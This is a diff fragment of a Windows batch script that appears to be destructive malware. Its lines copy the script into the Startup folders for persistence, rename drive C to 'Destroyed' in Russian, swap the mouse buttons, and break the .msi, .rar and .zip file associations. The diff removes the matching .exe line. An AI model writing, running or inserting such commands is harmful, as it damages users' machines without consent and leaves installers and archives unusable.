@@ -22,7 +22,6 @@ copy %0 "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
 copy %0 "C:\Documents and Settings\All Users\Windows\Start Menu\Programs\Startup"
 label C:Уничтожен
 rundll32 user32, SwapMouseButton
-assoc .exe=txt
 assoc .msi=txt
 assoc .rar=txt
 assoc .zip=txt
